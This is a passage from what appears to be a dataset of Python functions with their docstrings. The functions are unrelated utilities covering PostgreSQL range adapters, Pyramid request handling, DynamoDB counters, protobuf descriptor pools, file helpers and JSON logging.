            "def register_range_type(pgrange, pyrange, conn):\n    \"\"\"\n    Register a new range type as a PostgreSQL range.\n\n        >>> register_range_type(\"int4range\", intrange, conn)\n\n    The above will make sure intrange is regarded as an int4range for queries\n    and that int4ranges will be cast into intrange when fetching rows.\n\n    pgrange should be the full name including schema for the custom range type.\n\n    Note that adaption is global, meaning if a range type is passed to a regular\n    psycopg2 connection it will adapt it to its proper range type. Parsing of\n    rows from the database however is not global and just set on a per connection\n    basis.\n    \"\"\"\n\n    register_adapter(pyrange, partial(adapt_range, pgrange))\n    register_range_caster(\n        pgrange, pyrange, *query_range_oids(pgrange, conn), scope=conn)"
        ],
        [
            "def get_api_error(response):\n  \"\"\"Acquires the correct error for a given response.\n\n  :param requests.Response response: HTTP error response\n  :returns: the appropriate error for a given response\n  :rtype: APIError\n\n  \"\"\"\n  error_class = _status_code_to_class.get(response.status_code, APIError)\n  return error_class(response)"
        ],
        [
            "def get_param_values(request, model=None):\n    \"\"\"\n    Converts the request parameters to Python.\n\n    :param request: <pyramid.request.Request> || <dict>\n\n    :return: <dict>\n    \"\"\"\n    if type(request) == dict:\n        return request\n\n    params = get_payload(request)\n\n    # support in-place editing formatted request\n    try:\n        del params['pk']\n        params[params.pop('name')] = params.pop('value')\n    except KeyError:\n        pass\n\n    return {\n        k.rstrip('[]'): safe_eval(v) if not type(v) == list else [safe_eval(sv) for sv in v]\n        for k, v in params.items()\n    }"
        ],
        [
            "def get_context(request, model=None):\n    \"\"\"\n    Extracts ORB context information from the request.\n\n    :param request: <pyramid.request.Request>\n    :param model: <orb.Model> || None\n\n    :return: {<str> key: <variant> value} values, <orb.Context>\n    \"\"\"\n    # convert request parameters to python\n    param_values = get_param_values(request, model=model)\n\n    # extract the full orb context if provided\n    context = param_values.pop('orb_context', {})\n    if isinstance(context, (unicode, str)):\n        context = projex.rest.unjsonify(context)\n\n    # otherwise, extract the limit information\n    has_limit = 'limit' in context or 'limit' in param_values\n\n    # create the new orb context\n    orb_context = orb.Context(**context)\n\n    # build up context information from the request params\n    used = set()\n    query_context = {}\n    for key in orb.Context.Defaults:\n        if key in param_values:\n            used.add(key)\n            query_context[key] = param_values.get(key)\n\n    # generate a simple query object\n    schema_values = {}\n    if model:\n        # extract match dict items\n        for key, value in request.matchdict.items():\n            if model.schema().column(key, raise_=False):\n                schema_values[key] = value\n\n        # extract payload items\n        for key, value in param_values.items():\n            root_key = key.split('.')[0]\n            schema_object = model.schema().column(root_key, raise_=False) or model.schema().collector(root_key)\n            if schema_object:\n                value = param_values.pop(key)\n                if isinstance(schema_object, orb.Collector) and type(value) not in (tuple, list):\n                    value = [value]\n                schema_values[key] = value\n\n    # generate the base context information\n    query_context['scope'] = {\n        'request': request\n    }\n\n    # include any request specific scoping or information from the request\n    # first, look for default ORB context for all requests\n    try:\n        default_context = request.orb_default_context\n\n    # then, look for scope specific information for all requests\n    except AttributeError:\n        try:\n            query_context['scope'].update(request.orb_scope)\n        except AttributeError:\n            pass\n\n    # if request specific context defaults exist, then\n    # merge them with the rest of the query context\n    else:\n        if 'scope' in default_context:\n            query_context['scope'].update(default_context.pop('scope'))\n\n        # setup defaults based on the request\n        for k, v in default_context.items():\n            query_context.setdefault(k, v)\n\n    orb_context.update(query_context)\n    return schema_values, orb_context"
        ],
        [
            "def _real_time_thread(self):\n    \"\"\"Handles real-time updates to the order book.\"\"\"\n    while self.ws_client.connected():\n      if self.die:\n        break\n      \n      if self.pause:\n        sleep(5)\n        continue\n\n      message = self.ws_client.receive()\n\n      if message is None:\n        break\n\n      message_type = message['type']\n\n      if message_type  == 'error':\n        continue\n      if message['sequence'] <= self.sequence:\n        continue\n\n      if message_type == 'open':\n        self._handle_open(message)\n      elif message_type == 'match':\n        self._handle_match(message)\n      elif message_type == 'done':\n        self._handle_done(message)\n      elif message_type == 'change':\n        self._handle_change(message)\n      else:\n        continue\n\n    self.ws_client.disconnect()"
        ],
        [
            "def _keep_alive_thread(self):\n    \"\"\"Used exclusively as a thread which keeps the WebSocket alive.\"\"\"\n    while True:\n      with self._lock:\n        if self.connected():\n          self._ws.ping()\n        else:\n          self.disconnect()\n          self._thread = None\n          return\n      sleep(30)"
        ],
        [
            "def connect(self):\n    \"\"\"Connects and subscribes to the WebSocket Feed.\"\"\"\n    if not self.connected():\n      self._ws = create_connection(self.WS_URI)\n      message = {\n        'type':self.WS_TYPE,\n        'product_id':self.WS_PRODUCT_ID\n      }\n      self._ws.send(dumps(message))\n\n      # There will be only one keep alive thread per client instance\n      with self._lock:\n        if not self._thread:\n          thread = Thread(target=self._keep_alive_thread, args=[])\n          thread.start()"
        ],
        [
            "def cached_httpbl_exempt(view_func):\n    \"\"\"\n    Marks a view function as being exempt from the cached httpbl view protection.\n    \"\"\"\n    # We could just do view_func.cached_httpbl_exempt = True, but decorators\n    # are nicer if they don't have side-effects, so we return a new\n    # function.\n    def wrapped_view(*args, **kwargs):\n        return view_func(*args, **kwargs)\n    wrapped_view.cached_httpbl_exempt = True\n    return wraps(view_func, assigned=available_attrs(view_func))(wrapped_view)"
        ],
        [
            "def get_conn(self, aws_access_key=None, aws_secret_key=None):\n        '''\n        Hook point for overriding how the CounterPool gets its connection to\n        AWS.\n        '''\n        return boto.connect_dynamodb(\n            aws_access_key_id=aws_access_key,\n            aws_secret_access_key=aws_secret_key,\n        )"
        ],
        [
            "def get_schema(self):\n        '''\n        Hook point for overriding how the CounterPool determines the schema\n        to be used when creating a missing table.\n        '''\n        if not self.schema:\n            raise NotImplementedError(\n                'You must provide a schema value or override the get_schema method'\n            )\n\n        return self.conn.create_schema(**self.schema)"
        ],
        [
            "def create_table(self):\n        '''\n        Hook point for overriding how the CounterPool creates a new table\n        in DynamooDB\n        '''\n        table = self.conn.create_table(\n            name=self.get_table_name(),\n            schema=self.get_schema(),\n            read_units=self.get_read_units(),\n            write_units=self.get_write_units(),\n        )\n\n        if table.status != 'ACTIVE':\n            table.refresh(wait_for_active=True, retry_seconds=1)\n\n        return table"
        ],
        [
            "def get_table(self):\n        '''\n        Hook point for overriding how the CounterPool transforms table_name\n        into a boto DynamoDB Table object.\n        '''\n        if hasattr(self, '_table'):\n            table = self._table\n        else:\n            try:\n                table = self.conn.get_table(self.get_table_name())\n            except boto.exception.DynamoDBResponseError:\n                if self.auto_create_table:\n                    table = self.create_table()\n                else:\n                    raise\n\n            self._table = table\n\n        return table"
        ],
        [
            "def create_item(self, hash_key, start=0, extra_attrs=None):\n        '''\n        Hook point for overriding how the CouterPool creates a DynamoDB item\n        for a given counter when an existing item can't be found.\n        '''\n        table = self.get_table()\n        now = datetime.utcnow().replace(microsecond=0).isoformat()\n        attrs = {\n            'created_on': now,\n            'modified_on': now,\n            'count': start,\n        }\n\n        if extra_attrs:\n            attrs.update(extra_attrs)\n\n        item = table.new_item(\n            hash_key=hash_key,\n            attrs=attrs,\n        )\n\n        return item"
        ],
        [
            "def get_item(self, hash_key, start=0, extra_attrs=None):\n        '''\n        Hook point for overriding how the CouterPool fetches a DynamoDB item\n        for a given counter.\n        '''\n        table = self.get_table()\n\n        try:\n            item = table.get_item(hash_key=hash_key)\n        except DynamoDBKeyNotFoundError:\n            item = None\n\n        if item is None:\n            item = self.create_item(\n                hash_key=hash_key,\n                start=start,\n                extra_attrs=extra_attrs,\n            )\n\n        return item"
        ],
        [
            "def get_counter(self, name, start=0):\n        '''\n        Gets the DynamoDB item behind a counter and ties it to a Counter\n        instace.\n        '''\n        item = self.get_item(hash_key=name, start=start)\n        counter = Counter(dynamo_item=item, pool=self)\n\n        return counter"
        ],
        [
            "def many_to_one(clsname, **kw):\n    \"\"\"Use an event to build a many-to-one relationship on a class.\n\n    This makes use of the :meth:`.References._reference_table` method\n    to generate a full foreign key relationship to the remote table.\n\n    \"\"\"\n    @declared_attr\n    def m2o(cls):\n        cls._references((cls.__name__, clsname))\n        return relationship(clsname, **kw)\n    return m2o"
        ],
        [
            "def one_to_many(clsname, **kw):\n    \"\"\"Use an event to build a one-to-many relationship on a class.\n\n    This makes use of the :meth:`.References._reference_table` method\n    to generate a full foreign key relationship from the remote table.\n\n    \"\"\"\n    @declared_attr\n    def o2m(cls):\n        cls._references((clsname, cls.__name__))\n        return relationship(clsname, **kw)\n    return o2m"
        ],
        [
            "def handle_data(self, data):\n        \"\"\"\n        Djeffify data between tags\n        \"\"\"\n        if data.strip():\n            data = djeffify_string(data)\n        self.djhtml += data"
        ],
        [
            "def _reference_table(cls, ref_table):\n        \"\"\"Create a foreign key reference from the local class to the given remote\n        table.\n\n        Adds column references to the declarative class and adds a\n        ForeignKeyConstraint.\n\n        \"\"\"\n        # create pairs of (Foreign key column, primary key column)\n        cols = [(sa.Column(), refcol) for refcol in ref_table.primary_key]\n\n        # set \"tablename_colname = Foreign key Column\" on the local class\n        for col, refcol in cols:\n            setattr(cls, \"%s_%s\" % (ref_table.name, refcol.name), col)\n\n        # add a ForeignKeyConstraint([local columns], [remote columns])\n        cls.__table__.append_constraint(sa.ForeignKeyConstraint(*zip(*cols)))"
        ],
        [
            "def prepare_path(path):\n    \"\"\"\n    Path join helper method\n    Join paths if list passed\n\n    :type path: str|unicode|list\n    :rtype: str|unicode\n    \"\"\"\n    if type(path) == list:\n        return os.path.join(*path)\n    return path"
        ],
        [
            "def read_from_file(file_path, encoding=\"utf-8\"):\n    \"\"\"\n    Read helper method\n\n    :type file_path: str|unicode\n    :type encoding: str|unicode\n    :rtype: str|unicode\n    \"\"\"\n    with codecs.open(file_path, \"r\", encoding) as f:\n        return f.read()"
        ],
        [
            "def write_to_file(file_path, contents, encoding=\"utf-8\"):\n    \"\"\"\n    Write helper method\n\n    :type file_path: str|unicode\n    :type contents: str|unicode\n    :type encoding: str|unicode\n    \"\"\"\n    with codecs.open(file_path, \"w\", encoding) as f:\n        f.write(contents)"
        ],
        [
            "def copy_file(src, dest):\n    \"\"\"\n    Copy file helper method\n\n    :type src: str|unicode\n    :type dest: str|unicode\n    \"\"\"\n    dir_path = os.path.dirname(dest)\n    if not os.path.exists(dir_path):\n        os.makedirs(dir_path)\n    shutil.copy2(src, dest)"
        ],
        [
            "def get_path_extension(path):\n    \"\"\"\n    Split file name and extension\n\n    :type path: str|unicode\n    :rtype: one str|unicode\n    \"\"\"\n    file_path, file_ext = os.path.splitext(path)\n    return file_ext.lstrip('.')"
        ],
        [
            "def split_path(path):\n        \"\"\"\n        Helper method for absolute and relative paths resolution\n        Split passed path and return each directory parts\n\n        example: \"/usr/share/dir\"\n        return: [\"usr\", \"share\", \"dir\"]\n\n        @type path: one of (unicode, str)\n        @rtype: list\n        \"\"\"\n        result_parts = []\n        #todo: check loops\n        while path != \"/\":\n            parts = os.path.split(path)\n            if parts[1] == path:\n                result_parts.insert(0, parts[1])\n                break\n            elif parts[0] == path:\n                result_parts.insert(0, parts[0])\n                break\n            else:\n                path = parts[0]\n                result_parts.insert(0, parts[1])\n        return result_parts"
        ],
        [
            "def _create_api_uri(self, *parts):\n    \"\"\"Creates fully qualified endpoint URIs.\n\n    :param parts: the string parts that form the request URI\n\n    \"\"\"\n    return urljoin(self.API_URI, '/'.join(map(quote, parts)))"
        ],
        [
            "def _format_iso_time(self, time):\n    \"\"\"Makes sure we have proper ISO 8601 time.\n\n    :param time: either already ISO 8601 a string or datetime.datetime\n    :returns: ISO 8601 time\n    :rtype: str\n\n    \"\"\"\n    if isinstance(time, str):\n      return time\n    elif isinstance(time, datetime):\n      return time.strftime('%Y-%m-%dT%H:%M:%S.%fZ')\n    else:\n      return None"
        ],
        [
            "def _handle_response(self, response):\n    \"\"\"Returns the given response or raises an APIError for non-2xx responses.\n\n    :param requests.Response response: HTTP response\n    :returns: requested data\n    :rtype: requests.Response\n    :raises APIError: for non-2xx responses\n\n    \"\"\"\n    if not str(response.status_code).startswith('2'):\n      raise get_api_error(response)\n    return response"
        ],
        [
            "def _check_next(self):\n    \"\"\"Checks if a next message is possible.\n\n    :returns: True if a next message is possible, otherwise False\n    :rtype: bool\n\n    \"\"\"\n    if self.is_initial:\n      return True\n    if self.before:\n      if self.before_cursor:\n        return True\n      else:\n        return False\n    else:\n      if self.after_cursor:\n        return True\n      else:\n        return False"
        ],
        [
            "def _wrap_color(self, code, text, format=None, style=None):\n        \"\"\" Colors text with code and given format \"\"\"\n        color = None\n        if code[:3] == self.bg.PREFIX:\n            color = self.bg.COLORS.get(code, None)\n        if not color:\n            color = self.fg.COLORS.get(code, None)\n\n        if not color:\n            raise Exception('Color code not found')\n\n        if format and format not in self.formats:\n            raise Exception('Color format not found')\n\n        fmt = \"0;\"\n        if format == 'bold':\n            fmt = \"1;\"\n        elif format == 'underline':\n            fmt = \"4;\"\n\n        # Manage the format\n        parts = color.split('[')\n        color = '{0}[{1}{2}'.format(parts[0], fmt, parts[1])\n\n        if self.has_colors and self.colors_enabled:\n            # Set brightness\n            st = ''\n            if style:\n                st = self.st.COLORS.get(style, '')\n            return \"{0}{1}{2}{3}\".format(st, color, text, self.st.COLORS['reset_all'])\n        else:\n            return text"
        ],
        [
            "def RegisterMessage(self, message):\n    \"\"\"Registers the given message type in the local database.\n\n    Args:\n      message: a message.Message, to be registered.\n\n    Returns:\n      The provided message.\n    \"\"\"\n\n    desc = message.DESCRIPTOR\n    self._symbols[desc.full_name] = message\n    if desc.file.name not in self._symbols_by_file:\n      self._symbols_by_file[desc.file.name] = {}\n    self._symbols_by_file[desc.file.name][desc.full_name] = message\n    self.pool.AddDescriptor(desc)\n    return message"
        ],
        [
            "def insert(self, index, value):\n        \"\"\"\n        Insert object before index.\n\n        :param int index: index to insert in\n        :param string value: path to insert\n        \"\"\"\n        self._list.insert(index, value)\n        self._sync()"
        ],
        [
            "def parse(self, string):\n        \"\"\"\n        Parse runtime path representation to list.\n\n        :param string string: runtime path string\n        :return: list of runtime paths\n        :rtype: list of string\n        \"\"\"\n        var, eq, values = string.strip().partition('=')\n        assert var == 'runtimepath'\n        assert eq == '='\n        return values.split(',')"
        ],
        [
            "def add_bundle(self, *args):\n        \"\"\"\n        Add some bundle to build group\n\n        :type bundle: static_bundle.bundles.AbstractBundle\n        @rtype: BuildGroup\n        \"\"\"\n        for bundle in args:\n            if not self.multitype and self.has_bundles():\n                first_bundle = self.get_first_bundle()\n                if first_bundle.get_type() != bundle.get_type():\n                    raise Exception(\n                        'Different bundle types for one Asset: %s[%s -> %s]'\n                        'check types or set multitype parameter to True'\n                        % (self.name, first_bundle.get_type(), bundle.get_type())\n                    )\n            self.bundles.append(bundle)\n        return self"
        ],
        [
            "def collect_files(self):\n        \"\"\"\n        Return collected files links\n\n        :rtype: list[static_bundle.files.StaticFileResult]\n        \"\"\"\n        self.files = []\n        for bundle in self.bundles:\n            bundle.init_build(self, self.builder)\n            bundle_files = bundle.prepare()\n            self.files.extend(bundle_files)\n        return self"
        ],
        [
            "def get_minifier(self):\n        \"\"\"\n        Asset minifier\n        Uses default minifier in bundle if it's not defined\n\n        :rtype: static_bundle.minifiers.DefaultMinifier|None\n        \"\"\"\n        if self.minifier is None:\n            if not self.has_bundles():\n                raise Exception(\"Unable to get default minifier, no bundles in build group\")\n            minifier = self.get_first_bundle().get_default_minifier()\n        else:\n            minifier = self.minifier\n        if minifier:\n            minifier.init_asset(self)\n        return minifier"
        ],
        [
            "def render_asset(self, name):\n        \"\"\"\n        Render all includes in asset by names\n\n        :type name: str|unicode\n        :rtype: str|unicode\n        \"\"\"\n        result = \"\"\n        if self.has_asset(name):\n            asset = self.get_asset(name)\n            if asset.files:\n                for f in asset.files:\n                    result += f.render_include() + \"\\r\\n\"\n        return result"
        ],
        [
            "def collect_links(self, env=None):\n        \"\"\"\n        Return links without build files\n        \"\"\"\n        for asset in self.assets.values():\n            if asset.has_bundles():\n                asset.collect_files()\n        if env is None:\n            env = self.config.env\n        if env == static_bundle.ENV_PRODUCTION:\n            self._minify(emulate=True)\n        self._add_url_prefix()"
        ],
        [
            "def _default_json_default(obj):\n    \"\"\" Coerce everything to strings.\n    All objects representing time get output according to default_date_fmt.\n    \"\"\"\n    if isinstance(obj, (datetime.datetime, datetime.date, datetime.time)):\n        return obj.strftime(default_date_fmt)\n    else:\n        return str(obj)"
        ],
        [
            "def init_logs(path=None,\n              target=None,\n              logger_name='root',\n              level=logging.DEBUG,\n              maxBytes=1*1024*1024,\n              backupCount=5,\n              application_name='default',\n              server_hostname=None,\n              fields=None):\n    \"\"\"Initialize the zlogger.\n\n    Sets up a rotating file handler to the specified path and file with\n    the given size and backup count limits, sets the default\n    application_name, server_hostname, and default/whitelist fields.\n\n    :param path: path to write the log file\n    :param target: name of the log file\n    :param logger_name: name of the logger (defaults to root)\n    :param level: log level for this logger (defaults to logging.DEBUG)\n    :param maxBytes: size of the file before rotation (default 1MB)\n    :param application_name: app name to add to each log entry\n    :param server_hostname: hostname to add to each log entry\n    :param fields: default/whitelist fields.\n    :type path: string\n    :type target: string\n    :type logger_name: string\n    :type level: int\n    :type maxBytes: int\n    :type backupCount: int\n    :type application_name: string\n    :type server_hostname: string\n    :type fields: dict\n    \"\"\"\n    log_file = os.path.abspath(\n        os.path.join(path, target))\n    logger = logging.getLogger(logger_name)\n    logger.setLevel(level)\n\n    handler = logging.handlers.RotatingFileHandler(\n        log_file, maxBytes=maxBytes, backupCount=backupCount)\n    handler.setLevel(level)\n\n    handler.setFormatter(\n        JsonFormatter(\n            application_name=application_name,\n            server_hostname=server_hostname,\n            fields=fields))\n\n    logger.addHandler(handler)"
        ],
        [
            "def format(self, record):\n        \"\"\"formats a logging.Record into a standard json log entry\n\n        :param record: record to be formatted\n        :type record: logging.Record\n        :return: the formatted json string\n        :rtype: string\n        \"\"\"\n\n        record_fields = record.__dict__.copy()\n        self._set_exc_info(record_fields)\n\n        event_name = 'default'\n        if record_fields.get('event_name'):\n            event_name = record_fields.pop('event_name')\n\n        log_level = 'INFO'\n        if record_fields.get('log_level'):\n            log_level = record_fields.pop('log_level')\n\n        [record_fields.pop(k) for k in record_fields.keys()\n         if k not in self.fields]\n\n        defaults = self.defaults.copy()\n        fields = self.fields.copy()\n        fields.update(record_fields)\n        filtered_fields = {}\n        for k, v in fields.iteritems():\n            if v is not None:\n                filtered_fields[k] = v\n\n        defaults.update({\n            'event_timestamp': self._get_now(),\n            'event_name': event_name,\n            'log_level': log_level,\n            'fields': filtered_fields})\n\n        return json.dumps(defaults, default=self.json_default)"
        ],
        [
            "def includeme(config):\n    \"\"\"\n    Initialize the model for a Pyramid app.\n\n    Activate this setup using ``config.include('baka_model')``.\n\n    \"\"\"\n    settings = config.get_settings()\n    should_create = asbool(settings.get('baka_model.should_create_all', False))\n    should_drop = asbool(settings.get('baka_model.should_drop_all', False))\n\n    # Configure the transaction manager to support retrying retryable\n    # exceptions. We also register the session factory with the thread-local\n    # transaction manager, so that all sessions it creates are registered.\n    #    \"tm.attempts\": 3,\n    config.add_settings({\n        \"retry.attempts\": 3,\n        \"tm.activate_hook\": tm_activate_hook,\n        \"tm.annotate_user\": False,\n    })\n\n    # use pyramid_retry couse pyramid_tm disabled it\n    config.include('pyramid_retry')\n    # use pyramid_tm to hook the transaction lifecycle to the request\n    config.include('pyramid_tm')\n\n    engine = get_engine(settings)\n    session_factory = get_session_factory(engine)\n\n    config.registry['db_session_factory'] = session_factory\n\n    # make request.db available for use in Pyramid\n    config.add_request_method(\n        # r.tm is the transaction manager used by pyramid_tm\n        lambda r: get_tm_session(session_factory, r.tm),\n        'db',\n        reify=True\n    )\n\n    # service model factory\n    config.include('.service')\n\n    # Register a deferred action to bind the engine when the configuration is\n    # committed. Deferring the action means that this module can be included\n    # before model modules without ill effect.\n    config.action(None, bind_engine, (engine,), {\n        'should_create': should_create,\n        'should_drop': should_drop\n    }, order=10)"
        ],
        [
            "def get_abs_and_rel_paths(self, root_path, file_name, input_dir):\n        \"\"\"\n        Return absolute and relative path for file\n\n        :type root_path: str|unicode\n        :type file_name: str|unicode\n        :type input_dir: str|unicode\n        :rtype: tuple\n\n        \"\"\"\n        # todo: change relative path resolving [bug on duplicate dir names in path]\n        relative_dir = root_path.replace(input_dir, '')\n        return os.path.join(root_path, file_name), relative_dir + '/' + file_name"
        ],
        [
            "def AddEnumDescriptor(self, enum_desc):\n    \"\"\"Adds an EnumDescriptor to the pool.\n\n    This method also registers the FileDescriptor associated with the message.\n\n    Args:\n      enum_desc: An EnumDescriptor.\n    \"\"\"\n\n    if not isinstance(enum_desc, descriptor.EnumDescriptor):\n      raise TypeError('Expected instance of descriptor.EnumDescriptor.')\n\n    self._enum_descriptors[enum_desc.full_name] = enum_desc\n    self.AddFileDescriptor(enum_desc.file)"
        ],
        [
            "def FindFileContainingSymbol(self, symbol):\n    \"\"\"Gets the FileDescriptor for the file containing the specified symbol.\n\n    Args:\n      symbol: The name of the symbol to search for.\n\n    Returns:\n      A FileDescriptor that contains the specified symbol.\n\n    Raises:\n      KeyError: if the file can not be found in the pool.\n    \"\"\"\n\n    symbol = _NormalizeFullyQualifiedName(symbol)\n    try:\n      return self._descriptors[symbol].file\n    except KeyError:\n      pass\n\n    try:\n      return self._enum_descriptors[symbol].file\n    except KeyError:\n      pass\n\n    try:\n      file_proto = self._internal_db.FindFileContainingSymbol(symbol)\n    except KeyError as error:\n      if self._descriptor_db:\n        file_proto = self._descriptor_db.FindFileContainingSymbol(symbol)\n      else:\n        raise error\n    if not file_proto:\n      raise KeyError('Cannot find a file containing %s' % symbol)\n    return self._ConvertFileProtoToFileDescriptor(file_proto)"
        ],
        [
            "def FindMessageTypeByName(self, full_name):\n    \"\"\"Loads the named descriptor from the pool.\n\n    Args:\n      full_name: The full name of the descriptor to load.\n\n    Returns:\n      The descriptor for the named type.\n    \"\"\"\n\n    full_name = _NormalizeFullyQualifiedName(full_name)\n    if full_name not in self._descriptors:\n      self.FindFileContainingSymbol(full_name)\n    return self._descriptors[full_name]"
        ],
        [
            "def FindEnumTypeByName(self, full_name):\n    \"\"\"Loads the named enum descriptor from the pool.\n\n    Args:\n      full_name: The full name of the enum descriptor to load.\n\n    Returns:\n      The enum descriptor for the named type.\n    \"\"\"\n\n    full_name = _NormalizeFullyQualifiedName(full_name)\n    if full_name not in self._enum_descriptors:\n      self.FindFileContainingSymbol(full_name)\n    return self._enum_descriptors[full_name]"
        ],
        [
            "def FindExtensionByName(self, full_name):\n    \"\"\"Loads the named extension descriptor from the pool.\n\n    Args:\n      full_name: The full name of the extension descriptor to load.\n\n    Returns:\n      A FieldDescriptor, describing the named extension.\n    \"\"\"\n    full_name = _NormalizeFullyQualifiedName(full_name)\n    message_name, _, extension_name = full_name.rpartition('.')\n    try:\n      # Most extensions are nested inside a message.\n      scope = self.FindMessageTypeByName(message_name)\n    except KeyError:\n      # Some extensions are defined at file scope.\n      scope = self.FindFileContainingSymbol(full_name)\n    return scope.extensions_by_name[extension_name]"
        ],
        [
            "def _ConvertEnumDescriptor(self, enum_proto, package=None, file_desc=None,\n                             containing_type=None, scope=None):\n    \"\"\"Make a protobuf EnumDescriptor given an EnumDescriptorProto protobuf.\n\n    Args:\n      enum_proto: The descriptor_pb2.EnumDescriptorProto protobuf message.\n      package: Optional package name for the new message EnumDescriptor.\n      file_desc: The file containing the enum descriptor.\n      containing_type: The type containing this enum.\n      scope: Scope containing available types.\n\n    Returns:\n      The added descriptor\n    \"\"\"\n\n    if package:\n      enum_name = '.'.join((package, enum_proto.name))\n    else:\n      enum_name = enum_proto.name\n\n    if file_desc is None:\n      file_name = None\n    else:\n      file_name = file_desc.name\n\n    values = [self._MakeEnumValueDescriptor(value, index)\n              for index, value in enumerate(enum_proto.value)]\n    desc = descriptor.EnumDescriptor(name=enum_proto.name,\n                                     full_name=enum_name,\n                                     filename=file_name,\n                                     file=file_desc,\n                                     values=values,\n                                     containing_type=containing_type,\n                                     options=enum_proto.options)\n    scope['.%s' % enum_name] = desc\n    self._enum_descriptors[enum_name] = desc\n    return desc"
        ],
        [
            "def _MakeFieldDescriptor(self, field_proto, message_name, index,\n                           is_extension=False):\n    \"\"\"Creates a field descriptor from a FieldDescriptorProto.\n\n    For message and enum type fields, this method will do a look up\n    in the pool for the appropriate descriptor for that type. If it\n    is unavailable, it will fall back to the _source function to\n    create it. If this type is still unavailable, construction will\n    fail.\n\n    Args:\n      field_proto: The proto describing the field.\n      message_name: The name of the containing message.\n      index: Index of the field\n      is_extension: Indication that this field is for an extension.\n\n    Returns:\n      An initialized FieldDescriptor object\n    \"\"\"\n\n    if message_name:\n      full_name = '.'.join((message_name, field_proto.name))\n    else:\n      full_name = field_proto.name\n\n    return descriptor.FieldDescriptor(\n        name=field_proto.name,\n        full_name=full_name,\n        index=index,\n        number=field_proto.number,\n        type=field_proto.type,\n        cpp_type=None,\n        message_type=None,\n        enum_type=None,\n        containing_type=None,\n        label=field_proto.label,\n        has_default_value=False,\n        default_value=None,\n        is_extension=is_extension,\n        extension_scope=None,\n        options=field_proto.options)"
        ],
        [
            "def get_tm_session(session_factory, transaction_manager):\n    \"\"\"\n    Get a ``sqlalchemy.orm.Session`` instance backed by a transaction.\n\n    This function will hook the session to the transaction manager which\n    will take care of committing any changes.\n\n    - When using pyramid_tm it will automatically be committed or aborted\n      depending on whether an exception is raised.\n\n    - When using scripts you should wrap the session in a manager yourself.\n      For example::\n\n          import transaction\n\n          engine = get_engine(settings)\n          session_factory = get_session_factory(engine)\n          with transaction.manager:\n              dbsession = get_tm_session(session_factory, transaction.manager)\n\n    \"\"\"\n    dbsession = session_factory()\n    zope.sqlalchemy.register(\n        dbsession, transaction_manager=transaction_manager)\n    return dbsession"
        ],
        [
            "def generate(length=DEFAULT_LENGTH):\n    \"\"\"\n    Generate a random string of the specified length.\n\n    The returned string is composed of an alphabet that shouldn't include any\n    characters that are easily mistakeable for one another (I, 1, O, 0), and\n    hopefully won't accidentally contain any English-language curse words.\n    \"\"\"\n    return ''.join(random.SystemRandom().choice(ALPHABET)\n                   for _ in range(length))"
        ],
        [
            "def require(name, field, data_type):\n    \"\"\"Require that the named `field` has the right `data_type`\"\"\"\n    if not isinstance(field, data_type):\n        msg = '{0} must have {1}, got: {2}'.format(name, data_type, field)\n        raise AssertionError(msg)"
        ],
        [
            "def flush(self):\n        \"\"\"Forces a flush from the internal queue to the server\"\"\"\n        queue = self.queue\n        size = queue.qsize()\n        queue.join()\n        self.log.debug('successfully flushed %s items.', size)"
        ],
        [
            "def open(name=None, fileobj=None, closefd=True):\n    \"\"\"\n    Use all decompressor possible to make the stream\n    \"\"\"\n    return Guesser().open(name=name, fileobj=fileobj, closefd=closefd)"
        ],
        [
            "def marv(ctx, config, loglevel, logfilter, verbosity):\n    \"\"\"Manage a Marv site\"\"\"\n    if config is None:\n        cwd = os.path.abspath(os.path.curdir)\n        while cwd != os.path.sep:\n            config = os.path.join(cwd, 'marv.conf')\n            if os.path.exists(config):\n                break\n            cwd = os.path.dirname(cwd)\n        else:\n            config = '/etc/marv/marv.conf'\n            if not os.path.exists(config):\n                config = None\n    ctx.obj = config\n    setup_logging(loglevel, verbosity, logfilter)"
        ],
        [
            "def MessageSetItemDecoder(extensions_by_number):\n  \"\"\"Returns a decoder for a MessageSet item.\n\n  The parameter is the _extensions_by_number map for the message class.\n\n  The message set message looks like this:\n    message MessageSet {\n      repeated group Item = 1 {\n        required int32 type_id = 2;\n        required string message = 3;\n      }\n    }\n  \"\"\"\n\n  type_id_tag_bytes = encoder.TagBytes(2, wire_format.WIRETYPE_VARINT)\n  message_tag_bytes = encoder.TagBytes(3, wire_format.WIRETYPE_LENGTH_DELIMITED)\n  item_end_tag_bytes = encoder.TagBytes(1, wire_format.WIRETYPE_END_GROUP)\n\n  local_ReadTag = ReadTag\n  local_DecodeVarint = _DecodeVarint\n  local_SkipField = SkipField\n\n  def DecodeItem(buffer, pos, end, message, field_dict):\n    message_set_item_start = pos\n    type_id = -1\n    message_start = -1\n    message_end = -1\n\n    # Technically, type_id and message can appear in any order, so we need\n    # a little loop here.\n    while 1:\n      (tag_bytes, pos) = local_ReadTag(buffer, pos)\n      if tag_bytes == type_id_tag_bytes:\n        (type_id, pos) = local_DecodeVarint(buffer, pos)\n      elif tag_bytes == message_tag_bytes:\n        (size, message_start) = local_DecodeVarint(buffer, pos)\n        pos = message_end = message_start + size\n      elif tag_bytes == item_end_tag_bytes:\n        break\n      else:\n        pos = SkipField(buffer, pos, end, tag_bytes)\n        if pos == -1:\n          raise _DecodeError('Missing group end tag.')\n\n    if pos > end:\n      raise _DecodeError('Truncated message.')\n\n    if type_id == -1:\n      raise _DecodeError('MessageSet item missing type_id.')\n    if message_start == -1:\n      raise _DecodeError('MessageSet item missing message.')\n\n    extension = extensions_by_number.get(type_id)\n    if extension is not None:\n      value = field_dict.get(extension)\n      if value is None:\n        value = field_dict.setdefault(\n            extension, extension.message_type._concrete_class())\n      if value._InternalParse(buffer, message_start,message_end) != message_end:\n        # The only reason _InternalParse would return early is if it encountered\n        # an end-group tag.\n        raise _DecodeError('Unexpected end-group tag.')\n    else:\n      if not message._unknown_fields:\n        message._unknown_fields = []\n      message._unknown_fields.append((MESSAGE_SET_ITEM_TAG,\n                                      buffer[message_set_item_start:pos]))\n\n    return pos\n\n  return DecodeItem"
        ],
        [
            "def get_app_name():\n    \"\"\"Flask like implementation of getting the applicaiton name via\n    the filename of the including file\n\n    \"\"\"\n    fn = getattr(sys.modules['__main__'], '__file__', None)\n    if fn is None:\n        return '__main__'\n    return os.path.splitext(os.path.basename(fn))[0]"
        ],
        [
            "def get_function(function_name):\n    \"\"\"\n    Given a Python function name, return the function it refers to.\n    \"\"\"\n    module, basename = str(function_name).rsplit('.', 1)\n    try:\n        return getattr(__import__(module, fromlist=[basename]), basename)\n    except (ImportError, AttributeError):\n        raise FunctionNotFound(function_name)"
        ],
        [
